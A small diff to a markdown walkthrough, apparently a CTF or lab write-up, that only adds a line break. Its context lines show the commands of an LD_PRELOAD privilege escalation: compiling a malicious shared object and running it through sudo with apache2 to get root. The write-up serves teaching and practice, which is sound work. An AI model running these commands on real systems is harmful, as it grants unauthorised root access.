@@ -28,7 +28,7 @@ To compile:
 gcc -fPIC -shared -o root.so root.c -nostartfiles
 ```
 Finally, to escalate we have to use full path of binary which is allowed to run as root without a password we saw it by 
-`sudo -l` command:
+<br>`sudo -l` command:
 ```bash
 sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
 ```
